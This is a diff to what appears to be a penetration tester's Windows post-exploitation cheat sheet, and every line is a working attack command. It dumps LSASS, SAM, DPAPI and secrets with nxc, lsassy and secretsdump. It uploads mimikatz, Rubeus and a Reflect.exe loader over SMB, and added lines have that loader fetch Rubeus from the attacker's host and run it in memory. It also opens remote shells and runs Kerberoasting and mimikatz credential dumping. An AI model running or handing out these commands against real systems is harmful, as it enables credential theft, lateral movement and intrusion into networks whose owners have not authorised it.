@@ -1522,9 +1522,8 @@ sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_ALL_IPHERE__24'
 ## Dump: DPAPI, LSASS, SAM + Secrets
 (t=$TARGET; u=dbf; p='123qweasdF!'; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u $u -p $p --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u $u -p $p -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump $u:$p@$t) | tee dump_$t
 
-## Upload Binaries
-nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
-nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
+## Upload: Reflect.exe
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Reflect.exe Windows\\Tasks\\Reflect.exe
 
 ## Command Execution: Winrm / Winexe
 evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
@@ -1541,15 +1540,18 @@ impacket-dpapi masterkey -file dpapi/7dc6a492-36e2-4c2d-be66-ba29d263dda2 -sid S
 impacket-dpapi credential -file dpapi/936A68B5AC87C545C4A22D1AF264C8E9 -key 0xdcd70638e50e...
 
 ## Rubeus: Tickets
-rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'cmd.exe /c powershell'
-C:\Windows\Tasks\Rubeus.exe monitor /interval:5 /nowrap
-C:\Windows\Tasks\Rubeus.exe dump /nowrap
-C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap
-C:\Windows\Tasks\Rubeus.exe asreproast /nowrap
-C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap
+\windows\tasks\Reflect.exe http://$MYIP/windows/Rubeus.exe monitor /interval:5 /nowrap
+\windows\tasks\Reflect.exe http://$MYIP/windows/Rubeus.exe dump /nowrap
+\windows\tasks\Reflect.exe http://$MYIP/windows/Rubeus.exe tgtdeleg /nowrap
+\windows\tasks\Reflect.exe http://$MYIP/windows/Rubeus.exe asreproast /nowrap
+\windows\tasks\Reflect.exe http://$MYIP/windows/Rubeus.exe kerberoast /nowrap
 
-## Mimikatz: Dumps+
+## Mimikatz: In Memory + On Disk
+load kiwi
+kiwi_cmd "lsadump::secrets"
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
 rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
+
 privilege::debug
 token::elevate
 sekurlsa::logonpasswords
